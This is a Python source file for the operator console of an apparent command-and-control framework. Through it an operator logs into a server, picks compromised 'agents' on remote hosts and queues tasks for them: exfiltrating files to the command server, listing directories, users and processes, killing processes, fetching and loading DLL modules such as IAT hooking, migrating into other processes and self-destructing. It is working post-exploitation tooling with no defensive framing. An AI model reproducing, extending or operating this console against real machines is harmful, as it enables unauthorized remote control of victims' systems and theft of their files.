import sys
import time
import requests
from terminaltables import AsciiTable
from colorama import Fore, Back, Style
import json
import os


class Operator:

    def __init__(self, operator, password, url, endpoint):
        self.username = operator
        self.password = password
        self.endpoint = endpoint
        self.url = url + endpoint
        self.jsonHeader = headers = {'Content-Type': 'application/json'}
        self.sign_in = url + "/joint-ops"
        self.login_info = json.dumps({"username": self.username, "password": self.password})
        self.operatorFunctions = ["list-agents", "select-agent", "list-tasks", "view-stats", "info"]
        self.tasking = ["pd", "exfil", "users", "proc", "kill", "self-destruct", "load-module", "migrate"]
        self.modules = ["hooking"]
        self.hookingTasks = ["hook-iat", "check-self"]
        # print directory, upload file, show local users, show proceses, download, kill process, delete self,
        # retrieve DLL from server,
        self.storage = {}
        self.privs = None
        self.token = None
        self.fail = Fore.BLACK + Back.RED
        self.error = Fore.BLACK + Back.YELLOW
        self.success = Fore.BLACK + Back.LIGHTGREEN_EX
        self.mainScreen = [
            ["", "SELECT FUNCTION"],
            ["-----------1-----------", "list-agents"],
            ["-----------2-----------", "select-agent"],
            ["-----------3-----------", "list-tasks"],
            ["-----------4-----------", "view-stats"],
            ["-----------5-----------", "info [agent]"],
            ["-----------6-----------", "register-module"],
            ["-----------7-----------", "exit"]
        ]
        self.taskScreen = [
            ["COMMAND", "USAGE", "DESCRIPTION"],
            ["pd", "pd <dir>", "prints the contents of a specified directory"],
            ["exfil", "exfil <file path>", "uploads the file to the command server"],
            ["users", "users", "prints a list of local users"],
            ["proc", "proc", "prints a list of running processes"],
            ["kill", "kill <pid>", "kills a specified process"],
            ["load-module", "load-module <module>", "fetches and loads a DLL from the server"],
            ["migrate", "migrate <pid>", "migrate the agent to a new process"],
            ["self-destruct", "self-destruct","<WARNING>destroy the current agent and cease communication"],
            ["exit", "exit", "exit back to th main menu"]
        ]



    def login(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            response = requests.post(self.sign_in, data=self.login_info, headers=self.jsonHeader)
            json_ret = response.json()
            if json_ret["status"] == "success":
                self.privs = json_ret['privs']
                self.print_art()
                self.print_success(f"LOGIN SUCCESSFUL {response.status_code}" + Style.RESET_ALL)
                if response.elapsed.total_seconds() < 1:
                    time.sleep(2)
                return True
            else:
                self.print_error("ERROR - Unable to login with the supplied credentials")
                return False
        except Exception as e:
            self.print_error("ERROR - Unable to login with the supplied credentials")
            return False

###################################MAIN MENU FUNCTIONS###################################
    def main_menu(self):
        first = True
        function = None
        while True:
            #function = None
            if function not in ["1", "2", "3", "4", "5", "6"] and not first:
                self.print_main()
                self.print_error("PLEASE SELECT A VALID FUNCTION")
            else:
                self.print_main()
            function = input()
            if function == "1" or function == "list-agents":
                self.list_agents()
            elif function == "2" or function == "select-agent":
                self.select_agent()
            elif function == "3" or function == "list-tasks":
                self.list_tasks()
            elif function == "6" or function == "register-module":
                self.register_module()
            elif function == "7" or function == "exit":
                os.system('cls' if os.name == 'nt' else 'clear')
                self.print_success(f"EXIT {0}")
                sys.exit(0)
            first = False



    def register_module(self):
        files = os.listdir("./Gadgets/moduleConfig")
        printMod = [
            ["SELECTION #", "Module Name"]
        ]
        i = 0
        for file in files:
            f = file.split(".")[0]
            printMod.append([str(i), f])
            i += 1
        table = AsciiTable(printMod)
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_theme(table.table)
        self.print_theme("Select the target module #:")
        while True:
            try:
                selection = int(input())
            except Exception:
                os.system('cls' if os.name == 'nt' else 'clear')
                self.print_theme(table.table)
                self.print_theme("Select the target module #:")
                self.print_error("Please select a valid module")
                continue

            if selection >= 0 and selection < i:
                data = json.loads(self.login_info)
                data["function"] = "register-module"
                data["module-name"] = printMod[selection + 1][1]
                dllName = None

                with open(f"./Gadgets/moduleConfig/{printMod[selection + 1][1]}.conf", "r") as f:
                    lines = f.readlines()
                    for line in lines:
                        try:
                            split = line.split(": ")
                            if split[0] == "[dllName]":
                                dllName = split[1].strip()
                                data["dll"] = dllName
                                break
                        except Exception:
                            continue
                response = requests.post(self.url, headers=self.jsonHeader, data=json.dumps(data))
                if response.status_code == 200:
                   # os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_success(f"Successfully registered {printMod[selection + 1][1]}")
                    self.print_error("press any key to continue")
                    input()
                elif response.status_code == 201:
                    self.print_success(f"{printMod[selection + 1][1]} is already registered")
                    self.print_error("press any key to continue")
                    input()

                else:
                    #os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_fail("Unable to register module")
                    self.print_error("press any key to continue")
                    input()
                break
            else:
                os.system('cls' if os.name == 'nt' else 'clear')
                self.print_theme(table.table)
                self.print_theme("Select the target module #:")
                self.print_error("Please select a valid module")
                continue






    def list_tasks(self):
        data = json.loads(self.login_info)
        data['function'] = "list-tasks"
        response = requests.get(self.url, headers=self.jsonHeader, data=json.dumps(data))
        parsed = json.loads(response.text)["tasks"]
        t = [
            ["COMMAND", "RESULT", "AUTHOR", "TASK UUID", "TIME"]
        ]
        for task in parsed:
            t.append(task)
        table = AsciiTable(t)
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_theme(table.table)
        self.print_success("press any key to return")
        ex = input()


    def list_agents(self):
        data = json.loads(self.login_info)
        data['function'] = "list-agents"
        response = requests.get(self.url, headers=self.jsonHeader, data=json.dumps(data))
        parsed = json.loads(response.text)["agents"]
        t = [["HOSTNAME", "UUID"]]
        for agent in parsed:
            t.append(agent)
        table = AsciiTable(t)
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_theme(table.table)
        self.print_success("press any key to return")
        ex = input()

    def select_agent(self):
        name = None
        host = None
        modules= None
        data = json.loads(self.login_info)
        data['function'] = "list-agents"
        response = requests.get(self.url, headers=self.jsonHeader, data=json.dumps(data))
        parsed = json.loads(response.text)["agents"]
        t = [["SELECTION","HOSTNAME", "UUID", "LOADED MODULES"]]
        i = 0
        for agent in parsed:
            t.append([i, agent[0], agent[1], agent[2]])
            i += 1
        table = AsciiTable(t)
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_theme(table.table)
        self.print_theme("Select the target agent:")
        while True:
            try:
                selection = input()
                num = int(selection)
                if num < i and num >= 0:
                    data = json.loads(self.login_info)
                    name = t[num + 1][1]
                    uuid = t[num + 1][2]
                    modules = t[num + 1][3]
                    data['uuid'] = uuid
                    t = None
                    if modules != "":
                        t = self.getModuleFunctions(modules)
                    break
                else:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_theme(table.table)
                    self.print_theme("Select the target agent:")
                    self.print_error("Please select a valid #")
            except Exception as e:
                os.system('cls' if os.name == 'nt' else 'clear')
                self.print_theme(table.table)
                self.print_theme("Select the target agent:")
                self.print_error("Please select a valid #")
                continue

        check_funcs = self.tasking
        new_funcs = []
        if t:
            for func in t:
                new_funcs.append(func[0])
                check_funcs.append(func[0])
        err = None
        while True:
            if t:
                self.print_agentTasking(name, t)
            else:
                self.print_agentTasking(name)
            if err:
                self.print_error(err)
            select = input()
            if select.split(" ")[0] not in check_funcs and select != "exit":
                self.print_agentTasking(name)
                err = "INVALID OPTION"
                continue

            elif select.split(" ")[0] == "pd":
                err = self.pd(data, select)

            elif select.split(" ")[0] == "users":
                self.users(data)

            elif select.split(" ")[0] == "kill":
                self.kill(data, select)

            elif select.split(" ")[0] == "proc":
                self.proc(data)

            elif select.split(" ")[0] == "exfil":
                self.exfil(data, select)

            elif select.split(" ")[0] == "load-module":
                err = self.load_module(data, select)

            elif select == "exit":
                break

            elif select.split(" ")[0] in new_funcs:
                # need generic function that can send commands to any loaded module
                err = self.sendModuleFunction(data, select, modules)
            new_funcs.clear()




    def getModuleFunctions(self, modules):
        ret = []
        #modules will be separated by colon
        mod = modules.split(":")
        for modName in mod:
           # print(modName)
            try:
                with open(f"./Gadgets/moduleConfig/{modName}.conf", "r") as f:
                    lines = f.readlines()
                    name = lines[0].split(": ")[1].strip()
                    dllName = lines[1].split(": ")[1].strip()
                    numFunctions = int(lines[2].split(": ")[1].strip())
                    while numFunctions != 0:
                        app = []
                        for line in lines:
                            try:
                                label = line.split(": ")[0].strip()
                                value = line.split(": ")[1].strip()

                                if label == "[Name]":
                                    app.append(value)
                                elif label == "[Args]":
                                    app.append(value)
                                elif label == "[Description]":
                                    app.append(value)
                                if len(app) == 3:
                                    final = []
                                    final.append(app[0])
                                    final.append(f"{app[0]} <{app[1]}>")
                                    final.append(app[2])
                                    ret.append(final)
                                    app.clear()
                                    numFunctions -= 1
                            except Exception:
                                pass

            except Exception:
                pass

        return ret
###################################MAIN MENU FUNCTIONS###################################




###################################AGENT FUNCTIONS###################################

    def sendModuleFunction(self, data, select, modules):
        func = select.split(" ")[0]
        try:
            arg = select.split(" ")[1]
        except Exception:
            err = "no argument given"
            return err
        data["function"] = "module-function"
        data["arg"] = arg
        modlist = modules.split(":")
        for mod in modlist:
            if mod == "":
                continue
            with open(f"./Gadgets/moduleConfig/{mod}.conf", "r") as f:
                lines = f.readlines()
                i = 0
                for line in lines:
                    try:
                        value = line.split(": ")[1].strip()
                        if func == value:
                            function_num = lines[i - 1].split(": ")[1].strip()
                            data["num"] = function_num
                            data["module-name"] = mod
                            response = requests.post(self.url, headers=self.jsonHeader, data=json.dumps(data))
                            if response.status_code == 200:
                                jRet = json.loads(response.text)
                                self.print_success("Task successfully created.")
                                t = [
                                    ["-1-", "Wait on task"],
                                    ["-2-", "Return to agent menu"]
                                ]
                                table = AsciiTable(t)
                                self.print_theme(table.table)
                                choice = None
                                while choice not in ["1", "2"]:
                                    choice = input()
                                    if choice == "1":
                                        self.check_taskResult(jRet['tasknumber'])
                                        break
                                    elif choice == "2":
                                        break
                                return ""
                            else:
                                err = "Unable to schedule task"
                                return err
                    except Exception:
                        pass
                    i += 1


    def load_module(self, data, select):
        data["function"] = "load-module"
        arg = None
        try:
            arg = select.split(" ")[1]
        except Exception:
            pass
        if not arg:
            err = "No argument supplied --> pd <dir>"
            return err
        files = os.listdir("./Gadgets/moduleConfig/")
        found = False
        for file in files:
            f = file.split(".")[0]
            if f == arg:
                found = True
        if not found:
            err = "Module not found"
            return err

        data["arg"] = arg
        response = requests.post(self.url, headers=self.jsonHeader, data=json.dumps(data))
        if response.status_code == 200:
            jRet = json.loads(response.text)
            self.print_success("Task successfully created.")
            t = [
                ["-1-", "Wait on task"],
                ["-2-", "Return to agent menu"]
            ]
            table = AsciiTable(t)
            self.print_theme(table.table)
            choice = None
            while choice not in ["1", "2"]:
                choice = input()
                if choice == "1":
                    self.check_taskResult(jRet['tasknumber'])
                    break
                elif choice == "2":
                    break
            return ""


    def exfil(self, data, select):
        data["function"] = "exfil"
        arg = None
        try:
            arg = select.split(" ")[1]
        except Exception:
            pass
        if not arg:
            err = "No argument supplied --> pd <dir>"
            return err
        data["arg"] = select.split(" ")[1]
        response = requests.post(self.url, headers=self.jsonHeader, data=json.dumps(data))
        if response.status_code == 200:
            jRet = json.loads(response.text)
            self.print_success("Task successfully created.")
            t = [
                ["-1-", "Wait on task"],
                ["-2-", "Return to agent menu"]
            ]
            table = AsciiTable(t)
            self.print_theme(table.table)
            choice = None
            while choice not in ["1", "2"]:
                choice = input()
                if choice == "1":
                    self.check_taskResult(jRet['tasknumber'])
                    break
                elif choice == "2":
                    break
            return ""

    def kill(self, data, select):
        data["function"] = "kill"
        arg = None
        try:
            arg = select.split(" ")[1]
        except Exception:
            pass
        if not arg:
            err = "No argument supplied --> pd <dir>"
            return err
        data["arg"] = select.split(" ")[1]
        response = requests.post(self.url, headers=self.jsonHeader, data=json.dumps(data))
        if response.status_code == 200:
            jRet = json.loads(response.text)
            self.print_success("Task successfully created.")
            t = [
                ["-1-", "Wait on task"],
                ["-2-", "Return to agent menu"]
            ]
            table = AsciiTable(t)
            self.print_theme(table.table)
            choice = None
            while choice not in ["1", "2"]:
                choice = input()
                if choice == "1":
                    self.check_taskResult(jRet['tasknumber'])
                    break
                elif choice == "2":
                    break
            return ""


    def proc(self, data):
        data["function"] = "proc"
        arg = ""
        data["arg"] = ""
        response = requests.post(self.url, headers=self.jsonHeader, data=json.dumps(data))
        if response.status_code == 200:
            jRet = json.loads(response.text)
            self.print_success("Task successfully created.")
            t = [
                ["-1-", "Wait on task"],
                ["-2-", "Return to agent menu"]
            ]
            table = AsciiTable(t)
            self.print_theme(table.table)
            choice = None
            while choice not in ["1", "2"]:
                choice = input()
                if choice == "1":
                    self.check_taskResultProc(jRet['tasknumber'])
                    break
                elif choice == "2":
                    break
            return ""


    def users(self, data):
        data["function"] = "users"
        arg = ""
        data["arg"] = ""
        response = requests.post(self.url, headers=self.jsonHeader, data=json.dumps(data))
        if response.status_code == 200:
            jRet = json.loads(response.text)
            self.print_success("Task successfully created.")
            t = [
                ["-1-", "Wait on task"],
                ["-2-", "Return to agent menu"]
            ]
            table = AsciiTable(t)
            self.print_theme(table.table)
            choice = None
            while choice not in ["1", "2"]:
                choice = input()
                if choice == "1":
                    self.check_taskResult(jRet['tasknumber'])
                    break
                elif choice == "2":
                    break
            return ""


    def pd(self, data, select):
        data["function"] = "pd"
        arg = None
        try:
            arg = select.split(" ")[1]
        except Exception:
            pass
        if not arg:
            err = "No argument supplied --> pd <dir>"
            return err
        data["arg"] = select.split(" ")[1]
        response = requests.post(self.url, headers=self.jsonHeader, data=json.dumps(data))
        if response.status_code == 200:
            jRet = json.loads(response.text)
            self.print_success("Task successfully created.")
            t = [
                ["-1-", "Wait on task"],
                ["-2-", "Return to agent menu"]
            ]
            table = AsciiTable(t)
            self.print_theme(table.table)
            choice = None
            while choice not in ["1", "2"]:
                choice = input()
                if choice == "1":
                    self.check_taskResult(jRet['tasknumber'])
                    break
                elif choice == "2":
                    break
            return ""


    def check_taskResult(self, tasknumber):
        data = json.loads(self.login_info)
        data["function"] = "check-task"
        data["tasknumber"] = tasknumber
        response = requests.get(self.url, headers=self.jsonHeader, data=json.dumps(data))
        jData = response.json()
        status = jData["status"]
        i = 0
        while status == "PENDING":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(self.error + f"WAITING ON TASK. Time waited --> {int(i)}s" + Style.RESET_ALL)
            status = jData["status"]
            time.sleep(1)
            i += 1
            if int(i) % 3 == 0:
                response = requests.get(self.url, headers=self.jsonHeader, data=json.dumps(data))
                jData = response.json()
                status = jData["status"]
                i += response.elapsed.total_seconds()

        t = [
            ["STATUS", "DATA"],
            [jData['status'], jData['data']]
        ]
        table = AsciiTable(t)
        self.print_theme(table.table)
        self.print_success("press any key to return")
        input()


    def check_taskResultProc(self, tasknumber):
        data = json.loads(self.login_info)
        data["function"] = "check-task"
        data["tasknumber"] = tasknumber
        response = requests.get(self.url, headers=self.jsonHeader, data=json.dumps(data))
        jData = response.json()
        status = jData["status"]
        i = 0
        while status == "PENDING":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(self.error + f"WAITING ON TASK. Time waited --> {int(i)}s" + Style.RESET_ALL)
            status = jData["status"]
            time.sleep(1)
            i += 1
            if int(i) % 3 == 0:
                response = requests.get(self.url, headers=self.jsonHeader, data=json.dumps(data))
                jData = response.json()
                status = jData["status"]
                i += response.elapsed.total_seconds()

        t = [
            ["STATUS", "PID", "Process Name"],
        ]
       # print(jData["data"])
        task_data = json.loads(jData["data"])
        for entry in task_data:
            t.append(["", task_data[entry][1], task_data[entry][0]])

        table = AsciiTable(t)
        self.print_theme(table.table)
        self.print_success("press any key to return")
        input()

###################################AGENT FUNCTIONS###################################




###################################PRINTING FUNCTIONS###################################
    def print_main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        temp = self.mainScreen
        temp[0][0] = "[OPERATOR]: " + self.username
        table = AsciiTable(self.mainScreen)
        self.print_theme(table.table)

    def print_agentTasking(self, agent, moduleFunctions=None):
        tScreen = []
        for item in self.taskScreen:
            tScreen.append(item)
        exit = tScreen.pop(-1)
        if moduleFunctions:
            for funcDescription in moduleFunctions:
                tScreen.append(funcDescription)
        tScreen.append(exit)
        os.system('cls' if os.name == 'nt' else 'clear')
        table = AsciiTable(tScreen)
        self.print_theme(table.table)
        print(self.error + "Current agent:" + Style.RESET_ALL + " " + agent)

    def print_art(self):
        print(Fore.RED + r"""                                     
                                              ,-.. _. ,. ,._                 
                                          .-'         .     '.              
                                         /             .      /_./.         
                                        '                        '.         
                                       .                           '        
                                      '            =\ : , \         \
                                     '            '` `   `  =        '
                                     |,.        _\           ',       \
                                     /   \    ."               ',.    /
                                    || ,' `  ,                  ' \_.'
                                    |\ -. / ,       `'":,      /
                                  ,-= .   ,'       '_   `;.    |
                                 /  /  -'            "'`    ,:,
                              _,/|,'    ,                   '
                       ___,--' | |                    (    /
                  _,-'`        . .      .            , '- _'          .-.
                ,'              \        .       `,'"`';/.          ,'   )
              ,`                 .'       :     /  ';\\   '.     ,'    .'
            ,'                   |.\       ';.'.,. .;.\\  ,..:_'_    .
           /  .                    '.       .'';_:;'`  '_(        ' '-.
           |   .                     '.'.,-'   ,       (    '" - ._    )
          / .   `                      '.             _,'-._        ` (
         /                             _ |   '      .' '.    ' .  _    )
                                      (:)          '      '        '   
                              [Operator {username}]""".format(username=self.username))


    def print_success(self, message):
        print(self.success + message + Style.RESET_ALL)

    def print_fail(self, message):
        print(self.fail + message + Style.RESET_ALL)

    def print_error(self, message):
        print(self.error + message + Style.RESET_ALL)

    def print_theme(self, message):
        print(Fore.RED + message + Style.RESET_ALL)
###################################PRINTING FUNCTIONS###################################